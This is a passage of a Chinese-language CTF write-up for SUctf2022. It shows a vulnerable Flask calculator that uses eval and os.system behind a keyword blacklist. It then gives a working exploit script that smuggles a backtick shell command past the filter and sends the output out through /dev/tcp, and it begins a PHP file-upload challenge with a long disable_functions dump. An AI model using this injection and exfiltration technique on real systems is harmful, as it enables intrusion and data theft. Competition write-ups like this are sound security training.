+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>render_template_string<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>request<span class="token punctuation">,</span>current_app<span class="token punctuation">,</span>session<span class="token punctuation">,</span>abort<span class="token punctuation">,</span>send_from_directory
+<span class="token keyword">import</span> random
+<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse
+<span class="token keyword">import</span> os
+<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>utils <span class="token keyword">import</span> secure_filename
+<span class="token keyword">import</span> time
+
+app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'import'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'{'</span><span class="token punctuation">,</span><span class="token string">'}'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'getattr'</span><span class="token punctuation">,</span><span class="token string">'os'</span><span class="token punctuation">,</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'class'</span><span class="token punctuation">,</span><span class="token string">'subclasses'</span><span class="token punctuation">,</span><span class="token string">'mro'</span><span class="token punctuation">,</span><span class="token string">'request'</span><span class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'eval'</span><span class="token punctuation">,</span><span class="token string">'if'</span><span class="token punctuation">,</span><span class="token string">'subprocess'</span><span class="token punctuation">,</span><span class="token string">'file'</span><span class="token punctuation">,</span><span class="token string">'open'</span><span class="token punctuation">,</span><span class="token string">'popen'</span><span class="token punctuation">,</span><span class="token string">'builtins'</span><span class="token punctuation">,</span><span class="token string">'compile'</span><span class="token punctuation">,</span><span class="token string">'execfile'</span><span class="token punctuation">,</span><span class="token string">'from_pyfile'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'local'</span><span class="token punctuation">,</span><span class="token string">'self'</span><span class="token punctuation">,</span><span class="token string">'item'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">,</span><span class="token string">'getattribute'</span><span class="token punctuation">,</span><span class="token string">'func_globals'</span><span class="token punctuation">,</span><span class="token string">'__init__'</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">,</span><span class="token string">'__dict__'</span><span class="token punctuation">]</span>
+    flag <span class="token operator">=</span> <span class="token boolean">True</span>
+    <span class="token keyword">for</span> no <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> no<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            flag<span class="token operator">=</span> <span class="token boolean">False</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>no<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+    <span class="token keyword">return</span> flag
+    
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token string">"欢迎来到SUctf2022"</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span>
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/calc"</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr
+    num <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"num"</span><span class="token punctuation">)</span>
+    log <span class="token operator">=</span> <span class="token string">"echo {0} {1} {2}> ./tmp/log.txt"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y%m%d-%H%M%S"</span><span class="token punctuation">,</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ip<span class="token punctuation">,</span>num<span class="token punctuation">)</span>    
+    <span class="token keyword">if</span> waf<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            data <span class="token operator">=</span> eval<span class="token punctuation">(</span>num<span class="token punctuation">)</span>
+            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>log<span class="token punctuation">)</span>
+        <span class="token keyword">except</span><span class="token punctuation">:</span>
+            <span class="token keyword">pass</span>
+        <span class="token keyword">return</span> str<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"waf!!"</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span>  
+</code></pre>
+<p>看到过滤了小括号，猜测无法运行函数，于是放弃利用eval()，转而看起os.system函数，WAF中并没有过滤反引号，于是尝试用反引号进行函数运行。<br>但是这样在 eval 中就会报错，导致不会执行 os.system ，于是可利用 Python 中的注释符把反引号的内容注释掉。<br>发现可以出网，尝试利用bash命令将运行结果外带出来。<br>最后写脚本</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
+url<span class="token operator">=</span><span class="token string">"http://a971ce1a-be9a-43cf-b026-caf4cdaeec9b.node4.buuoj.cn:81"</span>
+
+<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'import'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'{'</span><span class="token punctuation">,</span><span class="token string">'}'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'getattr'</span><span class="token punctuation">,</span><span class="token string">'os'</span><span class="token punctuation">,</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'class'</span><span class="token punctuation">,</span><span class="token string">'subclasses'</span><span class="token punctuation">,</span><span class="token string">'mro'</span><span class="token punctuation">,</span><span class="token string">'request'</span><span class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'eval'</span><span class="token punctuation">,</span><span class="token string">'if'</span><span class="token punctuation">,</span><span class="token string">'subprocess'</span><span class="token punctuation">,</span><span class="token string">'file'</span><span class="token punctuation">,</span><span class="token string">'open'</span><span class="token punctuation">,</span><span class="token string">'popen'</span><span class="token punctuation">,</span><span class="token string">'builtins'</span><span class="token punctuation">,</span><span class="token string">'compile'</span><span class="token punctuation">,</span><span class="token string">'execfile'</span><span class="token punctuation">,</span><span class="token string">'from_pyfile'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'local'</span><span class="token punctuation">,</span><span class="token string">'self'</span><span class="token punctuation">,</span><span class="token string">'item'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">,</span><span class="token string">'getattribute'</span><span class="token punctuation">,</span><span class="token string">'func_globals'</span><span class="token punctuation">,</span><span class="token string">'__init__'</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">,</span><span class="token string">'__dict__'</span><span class="token punctuation">]</span>
+    flag <span class="token operator">=</span> <span class="token boolean">True</span>
+    <span class="token keyword">for</span> no <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> no<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            flag<span class="token operator">=</span> <span class="token boolean">False</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>no<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+    <span class="token keyword">return</span> flag
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    cmd<span class="token operator">=</span><span class="token string">"ls"</span>
+    cmd<span class="token operator">=</span>cmd<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">)</span>
+    num<span class="token operator">=</span>f<span class="token string">"1#`{cmd}`>/dev/tcp/ip/port&lt;"</span>
+    <span class="token comment" spellcheck="true">#ip="192.168.0.1"</span>
+    <span class="token comment" spellcheck="true">#log = "echo {0} {1} {2}> ./tmp/log.txt".format(time.strftime("%Y%m%d-%H%M%S", time.localtime()), ip, num)</span>
+    <span class="token comment" spellcheck="true">#print(log)</span>
+    num<span class="token operator">=</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>num<span class="token punctuation">)</span>
+    url<span class="token operator">=</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/calc?num=%s"</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true">#print(url)</span>
+</code></pre>
+<p>其中log为</p>
+<pre class=" language-1"><code class="language-1">echo 20220405-120804 192.168.0.1 1#`ls`>/dev/tcp/ip/port<> ./tmp/log.txt
+</code></pre>
+<p>构造的payload中的&lt;是为了闭合后面的&gt;重定向。<br>发包后监听可得到</p>
+<pre class=" language-1"><code class="language-1">Th1s_is\_\_F1114g bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+</code></pre>
+<p>猜测在Th1s_is__F1114g中，但_在WAF中被过滤，于是可以利用通配符，将命令换为cat /*。<br>得到flag。</p>
+<h2 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h2><p>进入题目环境，是一个文件上传题目，尝试上传，发现存在WAF而且只能上传php文件，尝试上传</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span>
+</code></pre>
+<p>访问发现，php是8.0.1版本，同时还有一堆disable_functions</p>
+<pre class=" language-1"><code class="language-1">zend_version, func_num_args, func_get_arg, func_get_args, strcmp, strncmp, strcasecmp, strncasecmp, each, error_log, defined, get_class, get_called_class, get_parent_class, method_exists, property_exists, class_exists, interface_exists, trait_exists, function_exists, class_alias, get_included_files, get_required_files, is_subclass_of, is_a, get_class_vars, get_object_vars, get_mangled_object_vars, get_class_methods, trigger_error, user_error, restore_error_handler, set_exception_handler, restore_exception_handler, get_declared_classes, get_declared_traits, get_declared_interfaces, get_defined_functions, get_defined_vars, create_function, get_resource_type, get_resources, get_loaded_extensions, extension_loaded, get_extension_funcs, get_defined_constants, debug_backtrace, debug_print_backtrace, gc_mem_caches, gc_collect_cycles, gc_enabled, gc_enable, gc_disable, gc_status, strtotime, date, idate, gmdate, mktime, gmmktime, checkdate, strftime, gmstrftime, time, localtime, getdate, date_create, date_create_immutable, date_create_from_format, date_create_immutable_from_format, date_parse, date_parse_from_format, date_get_last_errors, date_format, date_modify, date_add, date_sub, date_timezone_get, date_timezone_set, date_offset_get, date_diff, date_time_set, date_date_set, date_isodate_set, date_timestamp_set, date_timestamp_get, timezone_open, timezone_name_get, timezone_name_from_abbr, timezone_offset_get, timezone_transitions_get, timezone_location_get, timezone_identifiers_list, timezone_abbreviations_list, timezone_version_get, date_interval_create_from_date_string, date_interval_format, date_default_timezone_set, date_default_timezone_get, date_sunrise, date_sunset, date_sun_info, libxml_set_streams_context, libxml_use_internal_errors, libxml_get_last_error, libxml_clear_errors, libxml_get_errors, libxml_disable_entity_loader, libxml_set_external_entity_loader, openssl_get_cert_locations, openssl_spki_new, openssl_spki_verify, openssl_spki_export, openssl_spki_export_challenge, openssl_pkey_free, openssl_pkey_new, openssl_pkey_export, openssl_pkey_export_to_file, openssl_pkey_get_private, openssl_pkey_get_public, openssl_pkey_get_details, openssl_free_key, openssl_get_privatekey, openssl_get_publickey, openssl_x509_read, openssl_x509_free, openssl_x509_parse, openssl_x509_checkpurpose, openssl_x509_check_private_key, openssl_x509_verify, openssl_x509_export, openssl_x509_fingerprint, openssl_x509_export_to_file, openssl_pkcs12_export, openssl_pkcs12_export_to_file, openssl_pkcs12_read, openssl_csr_new, openssl_csr_export, openssl_csr_export_to_file, openssl_csr_sign, openssl_csr_get_subject, openssl_csr_get_public_key, openssl_digest, openssl_encrypt, openssl_decrypt, openssl_cipher_iv_length, openssl_sign, openssl_verify, openssl_seal, openssl_open, openssl_pbkdf2, openssl_pkcs7_verify, openssl_pkcs7_decrypt, openssl_pkcs7_sign, openssl_pkcs7_encrypt, openssl_pkcs7_read, openssl_private_encrypt, openssl_private_decrypt, openssl_public_encrypt, openssl_public_decrypt, openssl_get_md_methods, openssl_get_cipher_methods, openssl_get_curve_names, openssl_dh_compute_key, openssl_pkey_derive, openssl_random_pseudo_bytes, openssl_error_string, preg_match_all, preg_replace, preg_replace_callback, preg_replace_callback_array, preg_filter, preg_split, preg_quote, preg_grep, preg_last_error, readgzfile, gzrewind, gzclose, gzeof, gzgetc, gzgets, gzgetss, gzread, gzopen, gzpassthru, gzseek, gztell, gzwrite, gzputs, gzfile, gzcompress, gzuncompress, gzdeflate, gzinflate, gzencode, gzdecode, zlib_encode, zlib_decode, zlib_get_coding_type, deflate_init, deflate_add, inflate_init, inflate_add, inflate_get_status, inflate_get_read_len, ob_gzhandler, filter_input, filter_var, filter_input_array, filter_var_array, filter_list, filter_has_var, filter_id, hash, hash_file, hash_hmac, hash_hmac_file, hash_init, hash_update, hash_update_stream, hash_update_file, hash_final, hash_copy, hash_algos, hash_hmac_algos, hash_pbkdf2, hash_equals, hash_hkdf, mhash_keygen_s2k, mhash_get_block_size, mhash_get_hash_name, mhash_count, mhash, session_name, session_module_name, session_save_path, session_id, session_create_id, session_regenerate_id, session_decode, session_encode, session_start, session_destroy, session_unset, session_gc, session_set_save_handler, session_cache_limiter, session_cache_expire, session_set_cookie_params, session_get_cookie_params, session_write_close, session_abort, session_reset, session_status, session_register_shutdown, session_commit, sodium_crypto_aead_aes256gcm_is_available, sodium_crypto_aead_aes256gcm_decrypt, sodium_crypto_aead_aes256gcm_encrypt, sodium_crypto_aead_aes256gcm_keygen, sodium_crypto_aead_chacha20poly1305_decrypt, sodium_crypto_aead_chacha20poly1305_encrypt, sodium_crypto_aead_chacha20poly1305_keygen, sodium_crypto_aead_chacha20poly1305_ietf_decrypt, sodium_crypto_aead_chacha20poly1305_ietf_encrypt, sodium_crypto_aead_chacha20poly1305_ietf_keygen, sodium_crypto_aead_xchacha20poly1305_ietf_decrypt, sodium_crypto_aead_xchacha20poly1305_ietf_keygen, sodium_crypto_aead_xchacha20poly1305_ietf_encrypt, sodium_crypto_auth, sodium_crypto_auth_keygen, sodium_crypto_auth_verify, sodium_crypto_box, sodium_crypto_box_keypair, sodium_crypto_box_seed_keypair, sodium_crypto_box_keypair_from_secretkey_and_publickey, sodium_crypto_box_open, sodium_crypto_box_publickey, sodium_crypto_box_publickey_from_secretkey, sodium_crypto_box_seal, sodium_crypto_box_seal_open, sodium_crypto_box_secretkey, sodium_crypto_kx_keypair, sodium_crypto_kx_publickey, sodium_crypto_kx_secretkey, sodium_crypto_kx_seed_keypair, sodium_crypto_kx_client_session_keys, sodium_crypto_kx_server_session_keys, sodium_crypto_generichash, sodium_crypto_generichash_keygen, sodium_crypto_generichash_init, sodium_crypto_generichash_update, sodium_crypto_generichash_final, sodium_crypto_kdf_derive_from_key, sodium_crypto_kdf_keygen, sodium_crypto_pwhash, sodium_crypto_pwhash_str, sodium_crypto_pwhash_str_verify, sodium_crypto_pwhash_str_needs_rehash, sodium_crypto_pwhash_scryptsalsa208sha256, sodium_crypto_pwhash_scryptsalsa208sha256_str, sodium_crypto_pwhash_scryptsalsa208sha256_str_verify, sodium_crypto_scalarmult, sodium_crypto_secretbox, sodium_crypto_secretbox_keygen, sodium_crypto_secretbox_open, sodium_crypto_secretstream_xchacha20poly1305_keygen, sodium_crypto_secretstream_xchacha20poly1305_init_push, sodium_crypto_secretstream_xchacha20poly1305_push, sodium_crypto_secretstream_xchacha20poly1305_init_pull, sodium_crypto_secretstream_xchacha20poly1305_pull, sodium_crypto_secretstream_xchacha20poly1305_rekey, sodium_crypto_shorthash, sodium_crypto_shorthash_keygen, sodium_crypto_sign, sodium_crypto_sign_detached, sodium_crypto_sign_ed25519_pk_to_curve25519, sodium_crypto_sign_ed25519_sk_to_curve25519, sodium_crypto_sign_keypair, sodium_crypto_sign_keypair_from_secretkey_and_publickey, sodium_crypto_sign_open, sodium_crypto_sign_publickey, sodium_crypto_sign_secretkey, sodium_crypto_sign_publickey_from_secretkey, sodium_crypto_sign_seed_keypair, sodium_crypto_sign_verify_detached, sodium_crypto_stream, sodium_crypto_stream_keygen, sodium_crypto_stream_xor, sodium_add, sodium_compare, sodium_increment, sodium_memcmp, sodium_memzero, sodium_pad, sodium_unpad, sodium_bin2hex, sodium_hex2bin, sodium_bin2base64, sodium_base642bin, sodium_crypto_scalarmult_base, spl_classes, spl_autoload, spl_autoload_extensions, spl_autoload_register, spl_autoload_unregister, spl_autoload_functions, spl_autoload_call, class_parents, class_implements, class_uses, spl_object_hash, spl_object_id, iterator_to_array, iterator_count, iterator_apply, constant, bin2hex, hex2bin, sleep, usleep, time_nanosleep, time_sleep_until, strptime, flush, wordwrap, htmlspecialchars, htmlentities, html_entity_decode, htmlspecialchars_decode, get_html_translation_table, sha1, sha1_file, md5_file, crc32, iptcparse, iptcembed, getimagesize, getimagesizefromstring, image_type_to_mime_type, image_type_to_extension, phpversion, phpcredits, php_sapi_name, php_uname, php_ini_scanned_files, php_ini_loaded_file, strnatcmp, strnatcasecmp, substr_count, strspn, strcspn, strtok, strtoupper, ini_set, strpos, stripos, strrpos, strripos, strrev, hebrev, hebrevc, nl2br, basename, dirname, stripslashes, stripcslashes, stristr, strrchr, str_shuffle, str_word_count, str_split, strpbrk, substr_compare, utf8_encode, utf8_decode, strcoll, money_format, substr, substr_replace, quotemeta, ucfirst, lcfirst, ucwords, strtr, addslashes, addcslashes, rtrim, str_replace, str_ireplace, str_repeat, count_chars, chunk_split, trim, ltrim, strip_tags, similar_text, explode, implode, join, setlocale, localeconv, nl_langinfo, soundex, levenshtein, chr, ord, parse_str, str_getcsv, str_pad, chop, strchr, sprintf, printf, vprintf, vsprintf, fprintf, vfprintf, sscanf, fscanf, parse_url, urlencode, urldecode, rawurlencode, rawurldecode, http_build_query, readlink, linkinfo, symlink, link, unlink, exec, system, escapeshellcmd, passthru, shell_exec, proc_open, proc_close, proc_terminate, proc_get_status, proc_nice, rand, srand, getrandmax, mt_rand, mt_srand, mt_getrandmax, random_bytes, random_int, getservbyname, getservbyport, getprotobyname, getprotobynumber, getmyuid, getmygid, getmypid, getmyinode, getlastmod, password_hash, password_get_info, password_needs_rehash, password_verify, password_algos, convert_uuencode, convert_uudecode, abs, ceil, floor, round, sin, cos, tan, asin, acos, atan, atanh, atan2, sinh, cosh, tanh, asinh, acosh, expm1, log1p, pi, is_finite, is_nan, is_infinite, pow, exp, log, log10, sqrt, hypot, deg2rad, rad2deg, bindec, hexdec, octdec, decbin, decoct, dechex, base_convert, number_format, fmod, intdiv, inet_ntop, inet_pton, ip2long, long2ip, getenv, getopt, sys_getloadavg, microtime, gettimeofday, getrusage, hrtime, uniqid, quoted_printable_decode, quoted_printable_encode, convert_cyr_string, get_current_user, set_time_limit, header_register_callback, get_cfg_var, get_magic_quotes_gpc, get_magic_quotes_runtime, error_get_last, error_clear_last, call_user_func, call_user_func_array, forward_static_call, forward_static_call_array, serialize, unserialize, var_dump, var_export, debug_zval_dump, print_r, memory_get_usage, memory_get_peak_usage, register_shutdown_function, register_tick_function, unregister_tick_function, highlight_file, highlight_string, php_strip_whitespace, ini_get, ini_get_all, ini_alter, ini_restore, get_include_path, set_include_path, restore_include_path, setcookie, setrawcookie, header, header_remove, headers_sent, headers_list, http_response_code, connection_aborted, connection_status, ignore_user_abort, parse_ini_file, parse_ini_string, is_uploaded_file, gethostbyaddr, gethostbyname, gethostbynamel, gethostname, net_get_interfaces, dns_check_record, checkdnsrr, dns_get_mx, getmxrr, dns_get_record, intval, floatval, doubleval, strval, boolval, gettype, settype, is_null, is_resource, is_bool, is_int, is_float, is_integer, is_long, is_double, is_real, is_numeric, is_string, is_array, is_object, is_scalar, is_callable, is_iterable, is_countable, pclose, popen, readfile, rewind, rmdir, umask, fclose, feof, fgetc, fgets, fgetss, fread, fopen, fpassthru, ftruncate, fstat, fseek, ftell, fflush, fwrite, fputs, mkdir, rename, copy, tempnam, tmpfile, file, file_put_contents, stream_select, stream_context_create, stream_context_set_params, stream_context_get_params, stream_context_set_option, stream_context_get_options, stream_context_get_default, stream_context_set_default, stream_filter_prepend, stream_filter_append, stream_filter_remove, stream_socket_client, stream_socket_server, stream_socket_accept, stream_socket_get_name, stream_socket_recvfrom, stream_socket_sendto, stream_socket_enable_crypto, stream_socket_shutdown, stream_socket_pair, stream_copy_to_stream, stream_get_contents, stream_supports_lock, stream_isatty, fgetcsv, fputcsv, flock, get_meta_tags, stream_set_read_buffer, stream_set_write_buffer, set_file_buffer, stream_set_chunk_size, stream_set_blocking, socket_set_blocking, stream_get_meta_data, stream_get_line, stream_wrapper_register, stream_register_wrapper, stream_wrapper_unregister, stream_wrapper_restore, stream_get_wrappers, stream_get_transports, stream_resolve_include_path, stream_is_local, get_headers, stream_set_timeout, socket_set_timeout, socket_get_status, realpath, fnmatch, fsockopen, pfsockopen, pack, unpack, get_browser, crypt, opendir, closedir, chdir, getcwd, rewinddir, readdir, dir, scandir, glob, fileatime, filectime, filegroup, fileinode, filemtime, fileowner, fileperms, filesize, filetype, file_exists, is_writable, is_writeable, is_readable, is_executable, is_file, is_dir, is_link, stat, lstat, chown, chgrp, lchown, lchgrp, chmod, touch, clearstatcache, disk_total_space, disk_free_space, diskfreespace, realpath_cache_size, realpath_cache_get, ezmlm_hash, openlog, syslog, closelog, lcg_value, metaphone, ob_start, ob_flush, ob_clean, ob_end_flush, ob_end_clean, ob_get_flush, ob_get_clean, ob_get_length, ob_get_level, ob_get_status, ob_get_contents, ob_implicit_flush, ob_list_handlers, ksort, krsort, natsort, natcasesort, asort, arsort, sort, rsort, usort, uasort, uksort, shuffle, array_walk, array_walk_recursive, count, end, prev, next, reset, current, key, min, max, in_array, array_search, extract, compact, array_fill, array_fill_keys, range, array_multisort, array_push, array_pop, array_shift, array_unshift, array_splice, array_slice, array_merge, array_merge_recursive, array_replace, array_replace_recursive, array_keys, array_key_first, array_key_last, array_values, array_count_values, array_column, array_reverse, array_reduce, array_pad, array_flip, array_change_key_case, array_rand, array_unique, array_intersect, array_intersect_key, array_intersect_ukey, array_uintersect, array_intersect_assoc, array_uintersect_assoc, array_intersect_uassoc, array_uintersect_uassoc, array_diff, array_diff_key, array_diff_ukey, array_udiff, array_diff_assoc, array_udiff_assoc, array_diff_uassoc, array_udiff_uassoc, array_sum, array_product, array_filter, array_map, array_chunk, array_combine, array_key_exists, pos, sizeof, key_exists, assert, assert_options, version_compare, ftok, str_rot13, stream_get_filters, stream_filter_register, stream_bucket_make_writeable, stream_bucket_prepend, stream_bucket_append, stream_bucket_new, output_add_rewrite_var, output_reset_rewrite_vars, sys_get_temp_dir, apache_lookup_uri, virtual, apache_request_headers, apache_response_headers, apache_getenv, apache_note, apache_get_version, apache_get_modules, getallheaders, xxhash32, xxhash64, pdo_drivers, xml_parser_create, xml_parser_create_ns, xml_set_object, xml_set_element_handler, xml_set_character_data_handler, xml_set_processing_instruction_handler, xml_set_default_handler, xml_set_unparsed_entity_decl_handler, xml_set_notation_decl_handler, xml_set_external_entity_ref_handler, xml_set_start_namespace_decl_handler, xml_set_end_namespace_decl_handler, xml_parse, xml_parse_into_struct, xml_get_error_code, xml_error_string, xml_get_current_line_number, xml_get_current_column_number, xml_get_current_byte_index, xml_parser_free, xml_parser_set_option, xml_parser_get_option, jdtogregorian, gregoriantojd, jdtojulian, juliantojd, jdtojewish, jewishtojd, jdtofrench, gmp_prob_prime, gmp_gcd, gmp_gcdext, gmp_lcm, gmp_invert, gmp_jacobi, gmp_legendre, gmp_kronecker, gmp_cmp, gmp_sign, gmp_random, gmp_random_seed, gmp_random_bits, gmp_random_range, gmp_and, gmp_or, gmp_com, gmp_xor, gmp_setbit, gmp_clrbit, gmp_testbit, gmp_scan0, gmp_scan1, gmp_popcount, gmp_hamdist, gmp_nextprime, gmp_binomial, iconv, iconv_get_encoding, iconv_set_encoding, iconv_strlen, iconv_substr, iconv_strpos, iconv_strrpos, iconv_mime_encode, iconv_mime_decode, iconv_mime_decode_headers, json_encode, json_decode, json_last_error, json_last_error_msg, mb_convert_case, mb_strtoupper, mb_strtolower, mb_language, mb_internal_encoding, mb_http_input, mb_http_output, mb_detect_order, mb_substitute_character, mb_parse_str, mb_output_handler, mb_preferred_mime_name, mb_str_split, mb_strlen, mb_strpos, mb_strrpos, mb_stripos, mb_strripos, mb_strstr, mb_strrchr, mb_stristr, mb_strrichr, mb_substr_count, mb_substr, mb_strcut, mb_strwidth, mb_strimwidth, mb_convert_encoding, mb_detect_encoding, mb_list_encodings, mb_encoding_aliases, mb_convert_kana, mb_encode_mimeheader, mb_decode_mimeheader, mb_convert_variables, mb_encode_numericentity, mb_decode_numericentity, mb_send_mail, mb_get_info, mb_check_encoding, mb_ord, mb_chr, mb_scrub, mb_regex_encoding, mb_regex_set_options, mb_ereg, mb_eregi, mb_ereg_replace, mb_eregi_replace, mb_ereg_replace_callback, mb_split, mb_ereg_match, mb_ereg_search, mb_ereg_search_pos, mb_ereg_search_regs, mb_ereg_search_init, mb_ereg_search_getregs, mb_ereg_search_getpos, mb_ereg_search_setpos, mbregex_encoding, mbereg, mberegi, mbereg_replace, mberegi_replace, mbsplit, mbereg_match, mbereg_search, mbereg_search_pos, mbereg_search_regs, mbereg_search_init, mbereg_search_getregs, mbereg_search_getpos, mbereg_search_setpos, mysqli_affected_rows, mysqli_autocommit, mysqli_begin_transaction, mysqli_change_user, mysqli_character_set_name, mysqli_close, mysqli_commit, mysqli_connect, mysqli_connect_errno, mysqli_connect_error, mysqli_data_seek, mysqli_dump_debug_info, mysqli_debug, mysqli_errno, mysqli_error, mysqli_error_list, mysqli_stmt_execute, mysqli_execute, mysqli_fetch_field, mysqli_fetch_fields, mysqli_fetch_field_direct, mysqli_fetch_lengths, mysqli_fetch_all, mysqli_fetch_array, mysqli_fetch_assoc, mysqli_fetch_object, mysqli_fetch_row, mysqli_field_count, mysqli_field_seek, mysqli_field_tell, mysqli_free_result, mysqli_get_connection_stats, mysqli_get_client_stats, mysqli_get_charset, mysqli_get_client_info, mysqli_get_client_version, mysqli_get_links_stats, mysqli_get_host_info, mysqli_get_proto_info, mysqli_get_server_info, mysqli_get_server_version, mysqli_get_warnings, mysqli_init, mysqli_info, mysqli_insert_id, mysqli_kill, mysqli_more_results, mysqli_multi_query, mysqli_next_result, mysqli_num_fields, mysqli_num_rows, mysqli_options, mysqli_ping, mysqli_poll, mysqli_prepare, mysqli_report, mysqli_query, mysqli_real_connect, mysqli_real_escape_string, mysqli_real_query, mysqli_reap_async_query, mysqli_release_savepoint, mysqli_rollback, mysqli_savepoint, mysqli_select_db, mysqli_set_charset, mysqli_stmt_affected_rows, mysqli_stmt_attr_get, mysqli_stmt_attr_set, mysqli_stmt_bind_param, mysqli_stmt_bind_result, mysqli_stmt_close, mysqli_stmt_data_seek, mysqli_stmt_errno, mysqli_stmt_error, mysqli_stmt_error_list, mysqli_stmt_fetch, 